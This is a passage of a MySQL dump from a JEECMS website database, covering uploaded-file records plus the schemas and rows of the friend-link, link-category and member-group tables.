,NULL),('/u/cms/www/201609/19155012rfja.png','gmcs.png',0,NULL),('/u/cms/www/201609/19155535g178.png','gmcs.png',0,NULL),('/u/cms/www/201609/191556168oxh.png','zhye.png',0,NULL),('/u/cms/www/201609/191557592avc.png','zsr.png',0,NULL),('/u/cms/www/201609/19155839xtw8.png','zhye.png',0,NULL),('/u/cms/www/201609/191559127g8a.png','gmcs.png',0,NULL),('/u/cms/www/201609/19155948ohk3.png','gmcs.png',0,NULL),('/u/cms/www/201609/191601382uqh.png','txsj.png',0,NULL),('/u/cms/www/201609/19160214xqcz.png','gmcs.png',0,NULL),('/u/cms/www/201609/19160256yti4.png','txcs.png',0,NULL),('/u/cms/www/201609/22165418ezkw.jpg','vs.jpg',1,28),('/u/cms/www/201609/23091850z61y.jpg','ttsf.jpg',1,32),('/u/cms/www/201609/23092240hxg8.jpg','adff.jpg',1,33),('/u/cms/www/201609/23093922giys.jpg','bc.jpg',1,36),('/u/cms/www/201609/230942139uh5.jpg','xcv.jpg',1,37),('/u/cms/www/201609/23095358y6s6.jpg','qw.jpg',1,39),('/u/cms/www/201609/23100710845n.jpg','sf.jpg',0,NULL),('/u/cms/www/201609/23150119m7z0.jpg','zsf.jpg',1,27),('/u/cms/www/201609/26101908i5ds.jpg','video02.jpg',1,53),('/u/cms/www/201609/26102008qcao.jpg','video04.jpg',1,55),('/u/cms/www/201609/26102115joze.jpg','video06.jpg',1,57),('/u/cms/www/201609/261022192w54.jpg','video08.jpg',1,59),('/u/cms/www/201609/26102904f2l8.jpg','video12.jpg',1,61),('/u/cms/www/201609/26103003hrib.jpg','video11.jpg',1,63),('/u/cms/www/201609/261635496465.zip','演示.zip',1,69),('/u/cms/www/201609/26164039i3uv.jpg','dl-QQ.jpg',1,69),('/u/cms/www/201609/261640457r2n.jpg','dl_top.jpg',1,69),('/u/cms/www/201609/27094715plsz.jpg','download02.jpg',0,71),('/u/cms/www/201609/270953566xxw.jpg','content-bdy.jpg',0,NULL),('/u/cms/www/201609/27095528bd43.jpg','download02.jpg',0,NULL),('/u/cms/www/201609/270958122ljv.jpg','content-bdy.jpg',1,71),('/u/cms/www/201609/27095816s3y8.jpg','dl-bdy.jpg',1,71),('/u/cms/www/201609/271002022fag.zip','演示.zip',1,71),('/u/cms/www/201609/27101510bh0o.jpg','download03.jpg',1,72),('/u/cms/www/201609/27101514u0i9.jpg','content-360sd.jpg',1,72),('/u/cms/www/201609/27101524dxj7.jpg','dl-360shadu.jpg',1,72),('/u/cms/www/201609/27102743993k.zip','演示.zip',1,72),('/u/cms/www/201609/27103024lgp2.jpg','download02.jpg',0,71),('/u/cms/www/201609/271031297jwc.jpg','download02.jpg',0,71),('/u/cms/www/201609/27103421zh99.jpg','download04.jpg',0,71),('/u/cms/www/201609/27103503tm30.jpg','download04.jpg',0,71),('/u/cms/www/201610/08153906dmjk.jpg','wenku_item05.jpg',0,NULL),('/u/cms/www/201610/081540214khn.jpg','wenku_item05.jpg',0,NULL),('/u/cms/www/201610/08154224b4zl.jpg','wenku_item05.jpg',0,NULL),('/u/cms/www/201610/08155845dhts.jpg','wenku_item05.jpg',0,NULL),('/u/cms/www/201610/08160110rjjx.jpg','wenku_item05.jpg',0,NULL),('/u/cms/www/201610/081602097gfq.jpg','wenku_item05.jpg',0,NULL),('/u/cms/www/201610/08162230t0wf.jpg','wenku_item05.jpg',0,NULL),('/u/cms/www/201610/08162651u5t0.jpg','wenku_item05.jpg',0,NULL),('/u/cms/www/201610/10100842hqdk.jpg','topic_title03.jpg',1,NULL),('/u/cms/www/201610/10100850mssf.jpg','topic03.jpg',0,NULL),('/u/cms/www/201610/10100951y2xy.jpg','topic_title02.jpg',1,NULL),('/u/cms/www/201610/1010095517rc.jpg','topic02.jpg',0,NULL),('/u/cms/www/201610/101010021q7v.jpg','topic_title01.jpg',1,NULL),('/u/cms/www/201610/10101006fqv3.jpg','topic01.jpg',0,NULL),('/u/cms/www/201610/10110628vfwz.jpg','content-nycs.jpg',1,100),('/u/cms/www/201610/10110634gxcz.jpg','dl-nycs.jpg',1,100),('/u/cms/www/201610/10110654vib6.jpg','download01.jpg',1,100),('/u/cms/www/201610/10110756cg7o.zip','演示.zip',1,100),('/u/cms/www/201610/10111518cqda.zip','演示.zip',1,101),('/u/cms/www/201610/10111549rupn.jpg','content-xunlei.jpg',1,101),('/u/cms/www/201610/101116034e14.jpg','download05.jpg',1,101),('/u/cms/www/201610/10111618rhdk.jpg','dl-xunlei7.jpg',1,101),('/u/cms/www/201610/10111758q1kj.zip','演示.zip',1,102),('/u/cms/www/201610/101119026ukx.jpg','content-360safe.jpg',1,102),('/u/cms/www/201610/101119092w8r.jpg','dl-360safe.jpg',1,102),('/u/cms/www/201610/10112023kqfp.jpg','content-sougou.jpg',1,103),('/u/cms/www/201610/101120330mpz.jpg','dl-sougou.jpg',1,103),('/u/cms/www/201610/101120397iez.zip','演示.zip',1,103),('/u/cms/www/201610/10112554wirt.zip','演示.zip',1,104),('/u/cms/www/201610/10112657zklb.jpg','content-yy.jpg',1,104),('/u/cms/www/201610/10112706jiii.jpg','dl-YY.jpg',1,104),('/u/cms/www/201610/10112814u17l.zip','演示.zip',1,105),('/u/cms/www/201610/10112839cvwx.jpg','content-ali.jpg',1,105),('/u/cms/www/201610/10112845wryq.jpg','dl-aliwwmaijia.jpg',1,105),('/u/cms/www/201610/101130257966.zip','演示.zip',1,106),('/u/cms/www/201610/10113032zu0k.jpg','content-iqy.jpg',1,106),('/u/cms/www/201610/101130399dbt.jpg','dl-QIY.jpg',1,106),('/u/cms/www/201610/101131571wkz.zip','演示.zip',1,107),('/u/cms/www/201610/10113218ya2p.jpg','content-google.jpg',1,107),('/u/cms/www/201610/10113226knhj.jpg','dl-google.jpg',1,107),('/u/cms/www/201610/101133341nc3.zip','演示.zip',1,108),('/u/cms/www/201610/10113354g71e.jpg','content-360exp.jpg',1,108),('/u/cms/www/201610/10113400utfn.jpg','dl-360exp.jpg',1,108),('/u/cms/www/201610/10113459gvbx.zip','演示.zip',1,109),('/u/cms/www/201610/10113506jz07.jpg','content-pptv.jpg',1,109),('/u/cms/www/201610/1011351336l0.jpg','dl-PPTV.jpg',1,109),('/u/cms/www/201610/10113551yru8.jpg','content-txsp.jpg',1,110),('/u/cms/www/201610/101135560ne4.jpg','dl-txsp.jpg',1,110),('/u/cms/www/201610/101136270k36.zip','演示.zip',1,110),('/u/cms/www/201610/10114452yjhh.jpg','zxcvx.jpg',1,111),('/u/cms/www/201610/10114704dsba.jpg','cb.jpg',1,112),('/u/cms/www/201610/101308178wzr.jpg','df.jpg',1,114),('/u/cms/www/201610/101314450fs1.jpg','banner02.jpg',1,115),('/u/cms/www/201610/101317064t3l.jpg','xZ.jpg',0,NULL),('/u/cms/www/201610/10131759kpti.jpg','5672662427112447485.jpg',1,116),('/u/cms/www/201610/101320442qbi.jpg','zdsad.jpg',1,117),('/u/cms/www/201610/10132253w0rj.jpg','sf.jpg',1,118),('/u/cms/www/201610/101326014zdc.jpg','banner02.jpg',1,119),('/u/cms/www/201610/10133449hwwr.jpg','vjkhk.jpg',1,120),('/u/cms/www/201610/10133710to3f.jpg','video_banner02.jpg',1,121),('/u/cms/www/201610/10133842aiyf.png','video_Btn02.png',1,121),('/u/cms/www/201610/10133954jfoc.jpg','video_banner01.jpg',1,122),('/u/cms/www/201610/101340004te2.png','video_Btn01.png',1,122),('/u/cms/www/201610/101340393eav.png','video_Btn03.png',1,123),('/u/cms/www/201610/10134048htcl.jpg','video_banner03.jpg',1,123),('/u/cms/www/201610/10134238qppo.jpg','video10.jpg',1,124),('/u/cms/www/201610/10134440wmng.jpg','video01.jpg',1,125),('/u/cms/www/201610/101345564pok.jpg','video09.jpg',1,126),('/u/cms/www/201610/101346227ayf.jpg','video07.jpg',1,127),('/u/cms/www/201610/101346473kic.jpg','video05.jpg',1,128),('/u/cms/www/201610/10134720z8a5.jpg','zdsad.jpg',1,129),('/u/cms/www/201610/110911592mxa.jpg','hlwjia.jpg',1,NULL),('/u/cms/www/201610/110919049wkh.jpg','qglh.jpg',0,NULL),('/u/cms/www/201610/11092148co74.jpg','qglh.jpg',1,NULL),('/u/cms/www/201610/11092540p27t.jpg','zph.jpg',1,NULL),('/u/cms/www/201610/11092701sxi4.jpg','zph.jpg',0,NULL),('/u/cms/www/201610/11093237z5e8.jpg','fghj.jpg',1,141),('/u/cms/www/201610/11111659rnpb.mp4','/u/cms/www/201610/11111659rnpb.mp4',0,NULL),('/u/cms/www/201610/11111729glis.docx','测试.docx',0,NULL),('/u/cms/www/201610/11111806t1hj.mp4','/u/cms/www/201610/11111806t1hj.mp4',0,NULL),('/u/cms/www/201610/111118456g3w.docx','测试.docx',0,NULL),('/u/cms/www/201610/111118588poy.mp4','/u/cms/www/201610/111118588poy.mp4',0,NULL),('/u/cms/www/201610/11112051yx2x.mp4','/u/cms/www/201610/11112051yx2x.mp4',0,NULL),('/u/cms/www/201610/111121133pnh.mp4','/u/cms/www/201610/111121133pnh.mp4',0,NULL),('/u/cms/www/201610/111121213xss.docx','测试.docx',0,NULL),('/u/cms/www/201610/11112910l4qa.jpg','3c6d55fbb2fb43161e70f38528a4462308f7d3e6.jpg',0,NULL),('/u/cms/www/201610/11113157dh9e.jpg','0.jpg',0,NULL),('/u/cms/www/22093458gynd.jpg','22093458gynd.jpg',1,NULL),('/u/cms/www/22093502mmft.jpg','22093502mmft.jpg',1,NULL),('/u/cms/www/22093506l8pv.jpg','22093506l8pv.jpg',1,NULL),('/u/cms/www/22093509qm3l.jpg','22093509qm3l.jpg',1,NULL),('/u/cms/www/22093513srmf.jpg','22093513srmf.jpg',1,NULL),('/u/cms/www/22094752xoxd.jpg','22094752xoxd.jpg',1,NULL),('/u/cms/www/22094906lrj8.jpg','22094906lrj8.jpg',1,NULL),('/u/cms/www/22094911xe9x.jpg','22094911xe9x.jpg',1,NULL),('/u/cms/www/22094915t8h1.jpg','22094915t8h1.jpg',1,NULL),('/u/cms/www/22094918gnze.jpg','22094918gnze.jpg',1,NULL),('/u/cms/www/22100555lytj.jpg','22100555lytj.jpg',1,NULL),('/u/cms/www/22100558gfsb.jpg','22100558gfsb.jpg',1,NULL),('/u/cms/www/22100601l1us.jpg','22100601l1us.jpg',1,NULL),('/u/cms/www/22100606t8mw.jpg','22100606t8mw.jpg',1,NULL),('/u/cms/www/22100611o2gl.jpg','22100611o2gl.jpg',1,NULL),('/u/cms/www/23172935t4sb.jpg','23172935t4sb.jpg',1,NULL),('/u/cms/www/23172936acob.jpg','23172936acob.jpg',1,NULL),('/u/cms/www/23172937bli1.jpg','23172937bli1.jpg',1,NULL),('/u/cms/www/23172937r23n.jpg','23172937r23n.jpg',1,NULL),('/u/cms/www/23172939ln5a.jpg','23172939ln5a.jpg',1,NULL),('/u/cms/www/231729407e1v.jpg','231729407e1v.jpg',1,NULL),('/u/cms/www/231729434x7h.jpg','231729434x7h.jpg',1,NULL),('/u/cms/www/23172944o38x.jpg','23172944o38x.jpg',1,NULL),('/u/cms/www/23172944vvdh.jpg','23172944vvdh.jpg',1,NULL),('/u/cms/www/23172946mzqx.jpg','23172946mzqx.jpg',1,NULL),('/u/cms/www/23172947nrrl.jpg','23172947nrrl.jpg',1,NULL),('/u/cms/www/24102446b7al.jpg','24102446b7al.jpg',1,NULL),('/u/cms/www/24102503z9wj.jpg','24102503z9wj.jpg',1,NULL),('/u/cms/www/2416455972ro.jpg','2416455972ro.jpg',1,NULL),('/u/cms/www/241646340nq6.jpg','241646340nq6.jpg',1,NULL),('/u/cms/www/24164707ksjq.jpg','24164707ksjq.jpg',1,NULL),('/u/cms/www/26115537aper.jpg','26115537aper.jpg',1,NULL),('/u/cms/www/26115537rs0f.jpg','26115537rs0f.jpg',1,NULL),('/u/cms/www/26150136kryi.txt','26150136kryi.txt',1,NULL),('/u/cms/www/Thumbs.db','Thumbs.db',1,NULL),('/v6/u/cms/www/201401/13135536pnt2.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201401/131359296e9c.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201401/1314055350gc.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201401/13140606bjte.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201401/13140635xydz.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201401/13140702pfne.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201401/13140909s64p.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201401/13141723ywh0.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201401/13142644qpdm.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201401/131429269ikl.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201401/131431450xia.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201401/131431578u9o.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201403/1316123792p0.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/13163251c8d5.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/131634322gqg.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/131636277cxi.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/13163934xmp0.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/13164248ng73.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/13165347xxty.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/13170503bwpw.jpg','1.jpg',0,NULL),('/v6/u/cms/www/201403/13170603q1bw.jpg','1.jpg',0,NULL),('/v6/u/cms/www/201403/131706463pqt.jpg','1.jpg',0,NULL),('/v6/u/cms/www/201403/13172446osvy.jpg','1.jpg',0,NULL),('/v6/u/cms/www/201403/13172626x71c.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/13173752etj3.zip','ChromeSetup.zip',0,NULL),('/v6/u/cms/www/201403/13173805fii8.zip','ChromeSetup.zip',0,NULL),('/v6/u/cms/www/201403/14091703u57k.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/14091741h0w0.zip','ChromeSetup.zip',0,NULL),('/v6/u/cms/www/201403/14092030cnyx.mp4','18183451i5bi.mp4',0,NULL),('/v6/u/cms/www/201403/14092835ljai.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/14095531y5tg.zip','ChromeSetup.zip',0,NULL),('/v6/u/cms/www/201403/14095543za61.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/14095551kk1a.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/14095759mdqw.docx','0_開發需求_.docx',0,NULL),('/v6/u/cms/www/201403/14102936l7gw.txt','freemarker.txt',0,NULL),('/v6/u/cms/www/201403/14104521p9ey.zip','bbs-update-2012-11-2.zip',0,NULL),('/v6/u/cms/www/201403/14105137jxtn.mp4','/v6/u/cms/www/201403/14105137jxtn.mp4',0,NULL),('/v6/u/cms/www/201403/14112725dsar.zip','/v6/u/cms/www/201403/14112725dsar.zip',0,NULL),('/v6/u/cms/www/201403/14130702z3xz.png','/v6/u/cms/www/201403/14130702z3xz.png',0,NULL),('/v6/u/cms/www/201403/14165746s64i.pdf','1.pdf',0,NULL),('/v6/u/cms/www/201403/1914315903bj.jpg','1.jpg',0,NULL),('/v6/u/cms/www/201404/20151821gj8y.jpg','1.jpg',0,NULL),('/v6/u/cms/www/201404/2015202141s0.jpg','1.jpg',0,NULL),('/v6/u/cms/www/201404/211128348kuw.jpg','1.jpg',0,NULL),('/v6/u/cms/www/201404/2111305770l1.jpg','1.jpg',0,NULL),('/v6/u/cms/www/201404/21113452hsxh.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201404/211137096eif.jpg','mv.jpg',0,NULL),('/v6/u/cms/www/201404/211149148tx0.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201404/21115759y8sm.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201404/211511276v74.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201404/21151948k1fh.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201404/21154820xtfs.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201404/2115485050rw.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201404/21155236mk9b.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201404/22084701xqxy.doc','/v6/u/cms/www/201404/22084701xqxy.doc',0,NULL),('/v6/u/cms/www/201404/22084833ys27.doc','/v6/u/cms/www/201404/22084833ys27.doc',0,NULL),('/v6/u/cms/www/201404/22111217hftv.doc','Linux开启mysql远程连接.doc',0,NULL),('/v6/u/cms/www/201404/22111332dwt3.doc','Linux开启mysql远程连接.doc',0,NULL),('/v6/u/cms/www/201404/22114143pw1a.doc','Linux开启mysql远程连接.doc',0,NULL),('/v6/u/cms/www/201404/22132355vqdf.txt','IBM LDAP.txt',0,NULL),('/v6/u/cms/www/201404/22133304pnoh.txt','/v6/u/cms/www/201404/22133304pnoh.txt',0,NULL),('/v6/u/cms/www/201404/22133312pz3j.exe','wpp.exe',0,NULL),('/v6/u/cms/www/201404/22135235m1m1.txt','cmstop.txt',0,NULL),('/v6/u/cms/www/201404/22135348pbqp.swf','2.swf',0,NULL),('/v6/u/cms/www/201404/221353537d0o.doc','discuz_2.doc',0,NULL),('/v6/u/cms/www/201404/22140446zkgv.txt','jeecms新bug.txt',0,NULL),('/v6/u/cms/www/201404/22140629jx27.txt','360检测.txt',0,NULL),('/v6/u/cms/www/201404/22140634er4n.doc','Discuz_X2.0数据字典(数据库表作用解释).doc',0,NULL),('/v6/u/cms/www/201404/22140716e5bk.flv','/v6/u/cms/www/201404/22140716e5bk.flv',0,NULL),('/v6/u/cms/www/201404/22141101f9tv.txt','360检测.txt',0,NULL),('/v6/u/cms/www/201404/22141404irh6.docx','Apache_Shiro_使用手册.docx',0,NULL),('/v6/u/cms/www/201404/22142207xrqx.doc','Discuz_X2.0数据字典(数据库表作用解释).doc',0,NULL),('/v6/u/cms/www/201404/22145137jigp.docx','Apache_Shiro_使用手册.docx',0,NULL),('/v6/u/cms/www/201404/22145142drkb.docx','Apache_Shiro_使用手册.docx',0,NULL),('/v6/u/cms/www/201404/221501301rkt.docx','Apache_Shiro_使用手册.docx',0,NULL),('/v6/u/cms/www/201404/22151702mcwi.docx','Apache_Shiro_使用手册.docx',0,NULL),('/v6/u/cms/www/201404/22152145c9do.doc','Linux开启mysql远程连接.doc',0,NULL),('/v6/u/cms/www/201404/22152231wfrv.mp4','/v6/u/cms/www/201404/22152231wfrv.mp4',0,NULL),('/v6/u/cms/www/201404/22155743mgws.txt','bug平台推荐.txt',0,NULL),('/v6/u/cms/www/201404/22155756p9of.txt','flot柱状图.txt',0,NULL),('/v6/u/cms/www/201404/22155756scdn.txt','flot使用笔记.txt',0,NULL),('/v6/u/cms/www/201404/28134316erf3.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201404/281402505i20.jpg','mv.jpg',0,NULL),('/v6/u/cms/www/201404/28140346452f.jpg','mv.jpg',0,NULL),('/v6/u/cms/www/201404/30140543hzlx.gif','webLogo.gif',0,NULL),('/v6/u/cms/www/201405/08091845sh2l.jpg','1.JPG',0,NULL),('/v6/u/cms/www/201405/08092143cyap.jpg','1.JPG',0,NULL),('/v6/u/cms/www/201405/08092249ype2.jpg','1.JPG',0,NULL),('/v6/u/cms/www/201405/08092924h3fr.jpg','1.JPG',0,NULL),('/v6/u/cms/www/201405/08093111b3jm.jpg','1.JPG',0,NULL),('/v6/u/cms/www/201405/09083819wiab.jpg','mv.jpg',0,NULL),('/v6/u/cms/www/201405/090840146ik7.jpg','mv.jpg',0,NULL),('/v6/u/cms/www/201405/090918028k13.jpg','mv.jpg',0,NULL),('/v6/u/cms/www/201406/09144419786f.txt','bbs好的功能.txt',0,NULL),('/v6/u/cms/www/201406/09145849ap2u.docx','1.docx',0,NULL),('/v6/u/cms/www/201406/09151219pj5s.doc','2.doc',0,NULL),('/v6/u/cms/www/201406/0915215434ij.txt','cmstop.txt',0,NULL),('/v6/u/cms/www/201407/121650299xv9.doc','DiscuzX2文件说明,目录说明.doc',0,NULL),('/v6/u/cms/www/201407/12165642273e.doc','Discuz_X2.0数据字典(数据库表作用解释).doc',0,NULL),('/v6/u/cms/www/201407/12170522j2ct.jpg','1.jpg',0,NULL),('/v6/u/cms/www/201407/30093714q9ic.mp4','/v6/u/cms/www/201407/30093714q9ic.mp4',0,NULL),('/v6/u/cms/www/201407/30130947bmm3.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201407/30170627hj1m.jpg','mv.jpg',0,NULL),('/v6/u/cms/www/201407/31114444inln.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201407/31114945lp9t.jpg','mv.jpg',0,NULL),('/v6/u/cms/www/201407/31115246futn.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201407/31115423u7e6.jpg','mv1.jpg',0,NULL),('/v6/u/cms/www/201407/31132254zdh7.jpg','mv.jpg',0,NULL),('/v6/u/cms/www/201409/03105035q9em.mp4','/v6/u/cms/www/201409/03105035q9em.mp4',0,NULL),('/v6/u/cms/www/201409/03105050xcbs.txt','bug平台推荐.txt',0,NULL),('/v6/wenku/www/201312/241031214kys.txt','/v6/wenku/www/201312/241031214kys.txt',0,NULL),('/v6/wenku/www/201401/16164720tu2n.doc','/v6/wenku/www/201401/16164720tu2n.doc',0,NULL),('/v6/wenku/www/201401/17083718btie.doc','/v6/wenku/www/201401/17083718btie.doc',0,NULL),('/v6/wenku/www/201401/17084032522j.doc','/v6/wenku/www/201401/17084032522j.doc',0,NULL),('/v6/wenku/www/201401/170842070sy2.doc','/v6/wenku/www/201401/170842070sy2.doc',0,NULL),('/v6/wenku/www/201401/17084442fd08.doc','/v6/wenku/www/201401/17084442fd08.doc',0,NULL),('/v6/wenku/www/201401/17085101zvcg.doc','/v6/wenku/www/201401/17085101zvcg.doc',0,NULL),('/v6/wenku/www/201401/25095002cniq.doc','/v6/wenku/www/201401/25095002cniq.doc',0,NULL),('/v6/wenku/www/201403/10115402nl6c.docx','/v6/wenku/www/201403/10115402nl6c.docx',0,NULL),('/v6/wenku/www/201403/1011550974pv.docx','/v6/wenku/www/201403/1011550974pv.docx',0,NULL),('/v6/wenku/www/201403/101155409soa.txt','/v6/wenku/www/201403/101155409soa.txt',0,NULL),('/v6/wenku/www/201403/10115750uxwh.txt','/v6/wenku/www/201403/10115750uxwh.txt',0,NULL),('/v6/wenku/www/201406/04132656esvy.pdf','/v6/wenku/www/201406/04132656esvy.pdf',0,NULL),('/v6/wenku/www/201406/04133131ky4f.pdf','/v6/wenku/www/201406/04133131ky4f.pdf',0,NULL),('/v6/wenku/www/201406/04133159jryy.pdf','/v6/wenku/www/201406/04133159jryy.pdf',0,NULL),('/v6/wenku/www/201406/04133312rszg.pdf','/v6/wenku/www/201406/04133312rszg.pdf',0,NULL),('/v6/wenku/www/201406/04133437555h.pdf','/v6/wenku/www/201406/04133437555h.pdf',0,NULL),('/v6/wenku/www/201406/04133611h3sa.pdf','/v6/wenku/www/201406/04133611h3sa.pdf',0,NULL),('/v6/wenku/www/201406/041340029cmx.pdf','/v6/wenku/www/201406/041340029cmx.pdf',0,NULL),('/v6/wenku/www/201406/0413413473t5.pdf','/v6/wenku/www/201406/0413413473t5.pdf',0,NULL),('/v6/wenku/www/201406/041353368k3b.doc','/v6/wenku/www/201406/041353368k3b.doc',0,NULL),('/v6/wenku/www/201406/04135541s2ay.doc','/v6/wenku/www/201406/04135541s2ay.doc',0,NULL),('/v6/wenku/www/201408/08112543cj83.pdf','/v6/wenku/www/201408/08112543cj83.pdf',0,NULL),('/v6/wenku/www/201408/08131514njo0.pdf','/v6/wenku/www/201408/08131514njo0.pdf',0,NULL),('/v6/wenku/www/201411/061426416ze3.doc','/v6/wenku/www/201411/061426416ze3.doc',0,NULL),('/v6/wenku/www/201411/07142936mhzk.docx','/v6/wenku/www/201411/07142936mhzk.docx',0,NULL),('/v6/wenku/www/201411/07143112x1tn.docx','/v6/wenku/www/201411/07143112x1tn.docx',0,NULL);
/*!40000 ALTER TABLE `jc_file` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_friendlink`
--

DROP TABLE IF EXISTS `jc_friendlink`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_friendlink` (
  `friendlink_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `friendlinkctg_id` int(11) NOT NULL,
  `site_name` varchar(150) NOT NULL COMMENT '网站名称',
  `domain` varchar(255) NOT NULL COMMENT '网站地址',
  `logo` varchar(150) DEFAULT NULL COMMENT '图标',
  `email` varchar(100) DEFAULT NULL COMMENT '站长邮箱',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `views` int(11) NOT NULL DEFAULT '0' COMMENT '点击次数',
  `is_enabled` char(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  PRIMARY KEY (`friendlink_id`),
  KEY `fk_jc_ctg_friendlink` (`friendlinkctg_id`),
  KEY `fk_jc_friendlink_site` (`site_id`),
  CONSTRAINT `fk_jc_ctg_friendlink` FOREIGN KEY (`friendlinkctg_id`) REFERENCES `jc_friendlink_ctg` (`friendlinkctg_id`),
  CONSTRAINT `fk_jc_friendlink_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='CMS友情链接';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_friendlink`
--

LOCK TABLES `jc_friendlink` WRITE;
/*!40000 ALTER TABLE `jc_friendlink` DISABLE KEYS */;
INSERT INTO `jc_friendlink` VALUES (1,1,1,'JEECMS官网','http://www.jeecms.com',NULL,'jeecms@163.com','JEECMS是JavaEE版网站管理系统（Java Enterprise Edition Content Manage System）的简称。Java凭借其强大、稳定、安全、高效等多方面的优势，一直是企业级应用的首选。',35,'1',1),(2,1,1,'JEEBBS论坛','http://bbs.jeecms.com',NULL,'jeecms@163.com','JEEBBS论坛',5,'1',10),(3,1,2,'京东商城','http://www.360buy.com/','/u/cms/www/201112/1910271036lr.gif','','',4,'1',10),(4,1,2,'当当网','http://www.dangdang.com/','/u/cms/www/201112/191408344rwj.gif','','',1,'1',10),(5,1,2,'亚马逊','http://www.amazon.cn/','/u/cms/www/201112/19141012lh2q.gif','','',2,'1',10),(6,1,2,'ihush','http://www.ihush.com/','/u/cms/www/201112/19141255yrfb.gif','','',1,'1',10);
/*!40000 ALTER TABLE `jc_friendlink` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_friendlink_ctg`
--

DROP TABLE IF EXISTS `jc_friendlink_ctg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_friendlink_ctg` (
  `friendlinkctg_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `friendlinkctg_name` varchar(50) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  PRIMARY KEY (`friendlinkctg_id`),
  KEY `fk_jc_friendlinkctg_site` (`site_id`),
  CONSTRAINT `fk_jc_friendlinkctg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='CMS友情链接类别';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_friendlink_ctg`
--

LOCK TABLES `jc_friendlink_ctg` WRITE;
/*!40000 ALTER TABLE `jc_friendlink_ctg` DISABLE KEYS */;
INSERT INTO `jc_friendlink_ctg` VALUES (1,1,'文字链接',1),(2,1,'品牌专区（图片链接）',2),(4,1,'',10);
/*!40000 ALTER TABLE `jc_friendlink_ctg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_group`
--

DROP TABLE IF EXISTS `jc_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_group` (
  `group_id` int(11) NOT NULL AUTO_INCREMENT,
  `group_name` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `need_captcha` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否需要验证码',
  `need_check` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否需要审核',
  `allow_per_day` int(11) NOT NULL DEFAULT '4096' COMMENT '每日允许上传KB',
  `allow_max_file` int(11) NOT NULL DEFAULT '1024' COMMENT '每个文件最大KB',
  `allow_suffix` varchar(255) DEFAULT 'jpg,jpeg,gif,png,bmp' COMMENT '允许上传的后缀',
  `is_reg_def` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认会员组',
  PRIMARY KEY (`group_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='CMS会员组表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_group`
--

LOCK TABLES `jc_group` WRITE;
/*!40000 ALTER TABLE `jc_group` DISABLE KEYS */;
INSERT INTO `jc_group` VALUES (1,'普通会员',2,1,1,0,0,'',1),(2,'高级组',10,1,1,0,0,'',0),(3,'vip',11,1,1,0,0,'',0);
/*!40000 ALTER TABLE `jc_group` ENABLE KEYS */;
UNLOCK TABLES;

--
